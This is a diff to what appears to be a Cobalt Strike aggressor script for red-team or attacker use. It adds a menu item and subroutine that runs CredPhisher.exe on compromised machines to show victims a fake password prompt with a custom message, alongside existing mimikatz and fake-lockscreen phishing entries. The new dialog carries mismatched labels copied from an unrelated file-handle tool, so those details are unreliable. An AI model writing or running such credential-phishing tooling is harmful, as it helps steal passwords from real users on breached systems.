@@ -195,7 +195,14 @@ menu "Phishing Users"{
 				}
 			}
 		
-			
+#Run Custom CredPhisher	
+	item "Prompt Custom Message  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					custcredphisher($bid);
+				}
+			}
+						
 #Run Lock Screen Phishing Exploit
 					
 		item "Show Lockscreen to Phish Password  - T1141"{
@@ -439,7 +446,25 @@ bmimikatz($1, "token::list /enterpriseadmin");
 
 # Phish Users with small pop up box
 sub credphisher{
-bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
+}
+
+# Phish Users with custom pop up box
+sub custcredphisher{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "\"$3['popu']\"";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/CredPhisher.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Custom Cred Phisher Prompt");
+    drow_text($dialog, "popu",  "Please Enter A Custom Pop Up Message:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
 }
 
 # Phish Users with fake lockscreen
